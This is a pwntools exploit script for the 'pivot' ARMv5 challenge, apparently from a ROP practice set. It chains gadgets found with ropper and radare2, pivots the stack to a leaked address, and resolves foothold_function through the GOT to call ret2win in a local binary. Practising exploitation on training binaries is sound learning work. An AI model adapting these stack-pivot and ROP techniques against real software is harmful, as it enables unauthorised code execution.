#!/usr/bin/env python3
from pwn import *
import os

os.environ["QEMU_LD_PREFIX"] = "/usr/arm-linux-gnueabihf"

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'pivot_armv5-hf')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# ./pivot_armv5-hf_exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

# ropper --arch ARM --file pivot_armv5-hf
# 0x00010790: pop {r4, pc};
# 0x0001092c: mov r5, r4; mov r4, sp; mov sp, r5; pop {r4, r11, pc};
# 0x0001093c: ldr r0, [r11, #-0x10]; ldr r0, [r0]; pop {r4, r11, pc};
# 0x00010948: ldr r1, [r11, #-0x10]; add r0, r0, r1; str r0, [r11, #-8]; bx lr;
# 0x00010960: ldr r3, [r11, #-8]; ldr r7, [r11, #-0xc]; blx r3;
# 0x0001099c: pop {r1, r2, r4, r5, r6, r7, r8, r12, lr, pc};
POP_R4_PC = p32(0x10790)
MOV_R5_SP_POP_PC = p32(0x1092c)
LDR_R0 = p32(0x1093c)
LDR_R1 = p32(0x10948)
LDR_R3_R7_BLX_R3 = p32(0x10960)
POP_R124567812_LR_PC = p32(0x1099c)

# (r2) iS
# (r2) pd @ 0x00010608 (.plt section)
# ;-- foothold_function:
# 0x0001067c      00c68fe2       add ip, pc, 0, 12
FOOTHOLD_PLT = p32(0x1067c)

# (r2) iS
# pd @ 0x00021000 (.got section)
# ;-- reloc.foothold_function:
# 0x0002102c      .dword 0x00010608 ; section..plt           ; RELOC 32 foothold_function
FOOTHOLD_GOT = p32(0x2102c)

# r2 libpivot_armv5-hf.so
# (r2) aaa; afl
# 0x0000083c    1     32 sym.foothold_function
# 0x000009c8    3    168 sym.ret2win
RET2WIN_OFFSET = 0x9c8 - 0x83c

io = start()

io.recvuntil(b"libpivot\n")
NEW_SP = int((io.recvline()[-9:-1]).decode(), 16)
io.recvuntil(b"> ")

# Payload
payload  = p32(0xa5) + p32(NEW_SP+68) + POP_R124567812_LR_PC
payload += 8*p32(0xa5) + POP_R124567812_LR_PC + FOOTHOLD_PLT
payload += FOOTHOLD_GOT + p32(RET2WIN_OFFSET) + 6*p32(0xa5)
payload += LDR_R3_R7_BLX_R3 + LDR_R0
payload += p32(0xa5) + p32(NEW_SP+72) + LDR_R1

io.sendline(payload)

# Pivot
padding = b'A' * cyclic_find(0x6161616a)

pivot = padding
pivot += POP_R4_PC + p32(NEW_SP) + MOV_R5_SP_POP_PC

io.recvuntil(b"> ")
io.sendline(pivot)

io.interactive()
